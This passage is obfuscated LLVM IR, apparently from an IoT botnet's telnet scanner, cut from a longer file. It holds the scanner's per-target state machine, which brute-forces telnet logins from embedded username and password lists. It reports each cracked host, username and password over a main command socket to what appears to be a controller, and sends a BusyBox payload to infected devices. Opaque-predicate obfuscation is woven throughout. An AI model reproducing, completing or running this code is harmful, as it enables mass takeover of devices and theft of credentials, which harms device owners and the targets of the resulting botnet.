  %499 = load i32, i32* %10, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %500
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %501, i32 0, i32 11
  %503 = load i8*, i8** %502, align 8
  %504 = call i32 @read_until_response(i32 %498, i32 10000, i8* %503, i32 312, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %505 = icmp ne i32 %504, 0
  br i1 %505, label %506, label %541

; <label>:506:                                    ; preds = %493
  %507 = load i32, i32* %10, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 11
  %511 = load i8*, i8** %510, align 8
  %512 = call i32 @contains_fail(i8* %511)
  %513 = icmp ne i32 %512, 0
  br i1 %513, label %514, label %519

; <label>:514:                                    ; preds = %506
  %515 = load i32, i32* %10, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %516
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %517, i32 0, i32 3
  store i8 0, i8* %518, align 4
  br label %540

; <label>:519:                                    ; preds = %506
  %520 = load i32, i32* @x.89
  %521 = load i32, i32* @y.90
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %519
  %528 = load i32, i32* %10, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %529
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %530, i32 0, i32 3
  store i8 3, i8* %531, align 4
  %532 = load i32, i32* @x.89
  %533 = load i32, i32* @y.90
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %540

; <label>:540:                                    ; preds = %originalBBpart257, %514
  br label %1001

; <label>:541:                                    ; preds = %493
  %542 = load i32, i32* %10, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 9
  %546 = load i32, i32* %545, align 8
  %547 = add i32 %546, 6
  %548 = zext i32 %547 to i64
  %549 = call i64 @time(i64* null) #5
  %550 = icmp slt i64 %548, %549
  br i1 %550, label %551, label %576

; <label>:551:                                    ; preds = %541
  %552 = load i32, i32* @x.89
  %553 = load i32, i32* @y.90
  %554 = sub i32 %552, 1
  %555 = mul i32 %552, %554
  %556 = urem i32 %555, 2
  %557 = icmp eq i32 %556, 0
  %558 = icmp slt i32 %553, 10
  %559 = or i1 %557, %558
  br i1 %559, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %551
  %560 = load i32, i32* %10, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %561
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %562, i32 0, i32 3
  store i8 0, i8* %563, align 4
  %564 = load i32, i32* %10, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 4
  store i8 1, i8* %567, align 1
  %568 = load i32, i32* @x.89
  %569 = load i32, i32* @y.90
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %576

; <label>:576:                                    ; preds = %originalBBpart261, %541
  br label %1000

; <label>:577:                                    ; preds = %130
  %578 = load i32, i32* %10, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 0
  %582 = load i32, i32* %581, align 8
  %583 = call i64 @send(i32 %582, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.863, i32 0, i32 0), i64 7, i32 16384)
  %584 = icmp slt i64 %583, 0
  br i1 %584, label %585, label %594

; <label>:585:                                    ; preds = %577
  %586 = load i32, i32* %10, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 3
  store i8 0, i8* %589, align 4
  %590 = load i32, i32* %10, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %591
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %592, i32 0, i32 4
  store i8 1, i8* %593, align 1
  br label %1001

; <label>:594:                                    ; preds = %577
  %595 = load i32, i32* %10, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 3
  store i8 4, i8* %598, align 4
  br label %1000

; <label>:599:                                    ; preds = %130
  %600 = load i32, i32* @x.89
  %601 = load i32, i32* @y.90
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %599
  %608 = load i32, i32* %10, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %609
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %610, i32 0, i32 0
  %612 = load i32, i32* %611, align 8
  %613 = load i32, i32* %10, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 11
  %617 = load i8*, i8** %616, align 8
  %618 = call i32 @read_until_response(i32 %612, i32 10000, i8* %617, i32 312, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %619 = icmp ne i32 %618, 0
  %620 = load i32, i32* @x.89
  %621 = load i32, i32* @y.90
  %622 = sub i32 %620, 1
  %623 = mul i32 %620, %622
  %624 = urem i32 %623, 2
  %625 = icmp eq i32 %624, 0
  %626 = icmp slt i32 %621, 10
  %627 = or i1 %625, %626
  br i1 %627, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br i1 %619, label %628, label %663

; <label>:628:                                    ; preds = %originalBBpart265
  %629 = load i32, i32* %10, align 4
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %630
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %631, i32 0, i32 11
  %633 = load i8*, i8** %632, align 8
  %634 = call i32 @contains_fail(i8* %633)
  %635 = icmp ne i32 %634, 0
  br i1 %635, label %636, label %641

; <label>:636:                                    ; preds = %628
  %637 = load i32, i32* %10, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %638
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %639, i32 0, i32 3
  store i8 0, i8* %640, align 4
  br label %662

; <label>:641:                                    ; preds = %628
  %642 = load i32, i32* @x.89
  %643 = load i32, i32* @y.90
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %641
  %650 = load i32, i32* %10, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 3
  store i8 5, i8* %653, align 4
  %654 = load i32, i32* @x.89
  %655 = load i32, i32* @y.90
  %656 = sub i32 %654, 1
  %657 = mul i32 %654, %656
  %658 = urem i32 %657, 2
  %659 = icmp eq i32 %658, 0
  %660 = icmp slt i32 %655, 10
  %661 = or i1 %659, %660
  br i1 %661, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %662

; <label>:662:                                    ; preds = %originalBBpart269, %636
  br label %1001

; <label>:663:                                    ; preds = %originalBBpart265
  %664 = load i32, i32* @x.89
  %665 = load i32, i32* @y.90
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %663
  %672 = load i32, i32* %10, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %673
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %674, i32 0, i32 9
  %676 = load i32, i32* %675, align 8
  %677 = add i32 %676, 6
  %678 = zext i32 %677 to i64
  %679 = call i64 @time(i64* null) #5
  %680 = icmp slt i64 %678, %679
  %681 = load i32, i32* @x.89
  %682 = load i32, i32* @y.90
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBBpart277, label %originalBB71alteredBB

originalBBpart277:                                ; preds = %originalBB71
  br i1 %680, label %689, label %698

; <label>:689:                                    ; preds = %originalBBpart277
  %690 = load i32, i32* %10, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %691
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %692, i32 0, i32 3
  store i8 0, i8* %693, align 4
  %694 = load i32, i32* %10, align 4
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 4
  store i8 1, i8* %697, align 1
  br label %698

; <label>:698:                                    ; preds = %689, %originalBBpart277
  br label %1000

; <label>:699:                                    ; preds = %130
  %700 = load i32, i32* %10, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %701
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %702, i32 0, i32 0
  %704 = load i32, i32* %703, align 8
  %705 = call i64 @send(i32 %704, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.863, i32 0, i32 0), i64 7, i32 16384)
  %706 = icmp slt i64 %705, 0
  br i1 %706, label %707, label %732

; <label>:707:                                    ; preds = %699
  %708 = load i32, i32* @x.89
  %709 = load i32, i32* @y.90
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %707
  %716 = load i32, i32* %10, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %717
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %718, i32 0, i32 3
  store i8 0, i8* %719, align 4
  %720 = load i32, i32* %10, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %721
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %722, i32 0, i32 4
  store i8 1, i8* %723, align 1
  %724 = load i32, i32* @x.89
  %725 = load i32, i32* @y.90
  %726 = sub i32 %724, 1
  %727 = mul i32 %724, %726
  %728 = urem i32 %727, 2
  %729 = icmp eq i32 %728, 0
  %730 = icmp slt i32 %725, 10
  %731 = or i1 %729, %730
  br i1 %731, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %1001

; <label>:732:                                    ; preds = %699
  %733 = load i32, i32* %10, align 4
  %734 = sext i32 %733 to i64
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %734
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %735, i32 0, i32 3
  store i8 6, i8* %736, align 4
  br label %1000

; <label>:737:                                    ; preds = %130
  %738 = load i32, i32* @x.89
  %739 = load i32, i32* @y.90
  %740 = sub i32 %738, 1
  %741 = mul i32 %738, %740
  %742 = urem i32 %741, 2
  %743 = icmp eq i32 %742, 0
  %744 = icmp slt i32 %739, 10
  %745 = or i1 %743, %744
  br i1 %745, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %737
  %746 = load i32, i32* %10, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 0
  %750 = load i32, i32* %749, align 8
  %751 = load i32, i32* %10, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 11
  %755 = load i8*, i8** %754, align 8
  %756 = call i32 @read_until_response(i32 %750, i32 10000, i8* %755, i32 312, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %757 = icmp ne i32 %756, 0
  %758 = load i32, i32* @x.89
  %759 = load i32, i32* @y.90
  %760 = sub i32 %758, 1
  %761 = mul i32 %758, %760
  %762 = urem i32 %761, 2
  %763 = icmp eq i32 %762, 0
  %764 = icmp slt i32 %759, 10
  %765 = or i1 %763, %764
  br i1 %765, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br i1 %757, label %766, label %867

; <label>:766:                                    ; preds = %originalBBpart285
  %767 = load i32, i32* @x.89
  %768 = load i32, i32* @y.90
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %766
  %775 = call i64 @time(i64* null) #5
  %776 = trunc i64 %775 to i32
  %777 = load i32, i32* %10, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 9
  store i32 %776, i32* %780, align 8
  %781 = load i32, i32* %10, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %782
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 11
  %785 = load i8*, i8** %784, align 8
  %786 = call i32 @contains_fail(i8* %785)
  %787 = icmp ne i32 %786, 0
  %788 = load i32, i32* @x.89
  %789 = load i32, i32* @y.90
  %790 = sub i32 %788, 1
  %791 = mul i32 %788, %790
  %792 = urem i32 %791, 2
  %793 = icmp eq i32 %792, 0
  %794 = icmp slt i32 %789, 10
  %795 = or i1 %793, %794
  br i1 %795, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br i1 %787, label %796, label %817

; <label>:796:                                    ; preds = %originalBBpart289
  %797 = load i32, i32* @x.89
  %798 = load i32, i32* @y.90
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %796
  %805 = load i32, i32* %10, align 4
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 3
  store i8 0, i8* %808, align 4
  %809 = load i32, i32* @x.89
  %810 = load i32, i32* @y.90
  %811 = sub i32 %809, 1
  %812 = mul i32 %809, %811
  %813 = urem i32 %812, 2
  %814 = icmp eq i32 %813, 0
  %815 = icmp slt i32 %810, 10
  %816 = or i1 %814, %815
  br i1 %816, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br label %866

; <label>:817:                                    ; preds = %originalBBpart289
  %818 = load i32, i32* @mainCommSock, align 4
  %819 = load i32, i32* %10, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %820
  %822 = call i8* @get_telstate_host(%struct.telstate_t* %821)
  %823 = load i32, i32* %10, align 4
  %824 = sext i32 %823 to i64
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %824
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %825, i32 0, i32 5
  %827 = load i8, i8* %826, align 2
  %828 = zext i8 %827 to i64
  %829 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %828
  %830 = load i8*, i8** %829, align 8
  %831 = load i32, i32* %10, align 4
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %832
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %833, i32 0, i32 6
  %835 = load i8, i8* %834, align 1
  %836 = zext i8 %835 to i64
  %837 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %836
  %838 = load i8*, i8** %837, align 8
  %839 = call i32 (i32, i8*, ...) @sockprintf(i32 %818, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.864, i32 0, i32 0), i8* %822, i8* %830, i8* %838)
  %840 = load i32, i32* @mainCommSock, align 4
  %841 = load i32, i32* %10, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %842
  %844 = call i8* @get_telstate_host(%struct.telstate_t* %843)
  %845 = load i32, i32* %10, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 5
  %849 = load i8, i8* %848, align 2
  %850 = zext i8 %849 to i64
  %851 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %850
  %852 = load i8*, i8** %851, align 8
  %853 = load i32, i32* %10, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 6
  %857 = load i8, i8* %856, align 1
  %858 = zext i8 %857 to i64
  %859 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %858
  %860 = load i8*, i8** %859, align 8
  %861 = call i32 (i32, i8*, ...) @sockprintf(i32 %840, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.865, i32 0, i32 0), i8* %844, i8* %852, i8* %860)
  %862 = load i32, i32* %10, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 3
  store i8 7, i8* %865, align 4
  br label %866

; <label>:866:                                    ; preds = %817, %originalBBpart293
  br label %1001

; <label>:867:                                    ; preds = %originalBBpart285
  %868 = load i32, i32* %10, align 4
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %869
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %870, i32 0, i32 9
  %872 = load i32, i32* %871, align 8
  %873 = add i32 %872, 7
  %874 = zext i32 %873 to i64
  %875 = call i64 @time(i64* null) #5
  %876 = icmp slt i64 %874, %875
  br i1 %876, label %877, label %886

; <label>:877:                                    ; preds = %867
  %878 = load i32, i32* %10, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 3
  store i8 0, i8* %881, align 4
  %882 = load i32, i32* %10, align 4
  %883 = sext i32 %882 to i64
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %883
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %884, i32 0, i32 4
  store i8 1, i8* %885, align 1
  br label %886

; <label>:886:                                    ; preds = %877, %867
  br label %1000

; <label>:887:                                    ; preds = %130
  %888 = load i32, i32* @x.89
  %889 = load i32, i32* @y.90
  %890 = sub i32 %888, 1
  %891 = mul i32 %888, %890
  %892 = urem i32 %891, 2
  %893 = icmp eq i32 %892, 0
  %894 = icmp slt i32 %889, 10
  %895 = or i1 %893, %894
  br i1 %895, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %887
  call void @RemoveTempDirs()
  %896 = call i64 @time(i64* null) #5
  %897 = trunc i64 %896 to i32
  %898 = load i32, i32* %10, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 9
  store i32 %897, i32* %901, align 8
  %902 = load i32, i32* %10, align 4
  %903 = sext i32 %902 to i64
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %903
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %904, i32 0, i32 0
  %906 = load i32, i32* %905, align 8
  %907 = load i8*, i8** @Busybox_Payload, align 8
  %908 = load i8*, i8** @Busybox_Payload, align 8
  %909 = call i64 @strlen(i8* %908) #9
  %910 = call i64 @send(i32 %906, i8* %907, i64 %909, i32 16384)
  %911 = icmp slt i64 %910, 0
  %912 = load i32, i32* @x.89
  %913 = load i32, i32* @y.90
  %914 = sub i32 %912, 1
  %915 = mul i32 %912, %914
  %916 = urem i32 %915, 2
  %917 = icmp eq i32 %916, 0
  %918 = icmp slt i32 %913, 10
  %919 = or i1 %917, %918
  br i1 %919, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br i1 %911, label %920, label %935

; <label>:920:                                    ; preds = %originalBBpart297
  %921 = load i32, i32* %10, align 4
  %922 = sext i32 %921 to i64
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %922
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %923, i32 0, i32 0
  %925 = load i32, i32* %924, align 8
  %926 = call i32 @sclose(i32 %925)
  %927 = load i32, i32* %10, align 4
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %928
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %929, i32 0, i32 3
  store i8 0, i8* %930, align 4
  %931 = load i32, i32* %10, align 4
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %932
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %933, i32 0, i32 4
  store i8 1, i8* %934, align 1
  br label %1001

; <label>:935:                                    ; preds = %originalBBpart297
  %936 = load i32, i32* %10, align 4
  %937 = sext i32 %936 to i64
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %937
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %938, i32 0, i32 4
  store i8 3, i8* %939, align 1
  %940 = load i32, i32* %10, align 4
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %941
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %942, i32 0, i32 9
  %944 = load i32, i32* %943, align 8
  %945 = add i32 %944, 60
  %946 = zext i32 %945 to i64
  %947 = call i64 @time(i64* null) #5
  %948 = icmp slt i64 %946, %947
  br i1 %948, label %949, label %999

; <label>:949:                                    ; preds = %935
  %950 = load i32, i32* %10, align 4
  %951 = sext i32 %950 to i64
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %951
  %953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %952, i32 0, i32 4
  %954 = load i8, i8* %953, align 1
  %955 = zext i8 %954 to i32
  %956 = icmp ne i32 %955, 3
  br i1 %956, label %957, label %974

; <label>:957:                                    ; preds = %949
  %958 = load i32, i32* @x.89
  %959 = load i32, i32* @y.90
  %960 = sub i32 %958, 1
  %961 = mul i32 %958, %960
  %962 = urem i32 %961, 2
  %963 = icmp eq i32 %962, 0
  %964 = icmp slt i32 %959, 10
  %965 = or i1 %963, %964
  br i1 %965, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %957
  %966 = load i32, i32* @x.89
  %967 = load i32, i32* @y.90
  %968 = sub i32 %966, 1
  %969 = mul i32 %966, %968
  %970 = urem i32 %969, 2
  %971 = icmp eq i32 %970, 0
  %972 = icmp slt i32 %967, 10
  %973 = or i1 %971, %972
  br i1 %973, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %974

; <label>:974:                                    ; preds = %originalBBpart2101, %949
  %975 = load i32, i32* @x.89
  %976 = load i32, i32* @y.90
  %977 = sub i32 %975, 1
  %978 = mul i32 %975, %977
  %979 = urem i32 %978, 2
  %980 = icmp eq i32 %979, 0
  %981 = icmp slt i32 %976, 10
  %982 = or i1 %980, %981
  br i1 %982, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %974
  %983 = load i32, i32* %10, align 4
  %984 = sext i32 %983 to i64
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %984
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %985, i32 0, i32 3
  store i8 0, i8* %986, align 4
  %987 = load i32, i32* %10, align 4
  %988 = sext i32 %987 to i64
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %988
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %989, i32 0, i32 4
  store i8 1, i8* %990, align 1
  %991 = load i32, i32* @x.89
  %992 = load i32, i32* @y.90
  %993 = sub i32 %991, 1
  %994 = mul i32 %991, %993
  %995 = urem i32 %994, 2
  %996 = icmp eq i32 %995, 0
  %997 = icmp slt i32 %992, 10
  %998 = or i1 %996, %997
  br i1 %998, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %999

; <label>:999:                                    ; preds = %originalBBpart2105, %935
  br label %1000

; <label>:1000:                                   ; preds = %999, %886, %732, %698, %594, %576, %originalBBpart253, %300, %130
  br label %1001

; <label>:1001:                                   ; preds = %1000, %920, %866, %originalBBpart281, %662, %585, %540, %originalBBpart249, %415, %221
  %1002 = load i32, i32* %10, align 4
  %1003 = add nsw i32 %1002, 1
  store i32 %1003, i32* %10, align 4
  br label %96

; <label>:1004:                                   ; preds = %96
  br label %78
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %1006 = alloca i32, align 4
  %1007 = alloca i32, align 4
  %1008 = alloca i32, align 4
  %1009 = alloca i32, align 4
  %1010 = alloca i32, align 4
  %1011 = alloca i32, align 4
  %1012 = alloca [128 x i8], align 16
  %1013 = alloca i8, align 1
  %1014 = alloca %struct.fd_set, align 8
  %1015 = alloca %struct.timeval, align 8
  %1016 = alloca i32, align 4
  %1017 = alloca [256 x i8], align 16
  %1018 = alloca i8*, align 8
  %1019 = alloca %struct.sockaddr_in, align 4
  %1020 = alloca i8*, align 8
  %1021 = alloca i8*, align 8
  %1022 = alloca i32, align 4
  %1023 = alloca i32, align 4
  store i32 312, i32* %1006, align 4
  %1024 = load i32, i32* %1006, align 4
  store i32 %1024, i32* %1011, align 4
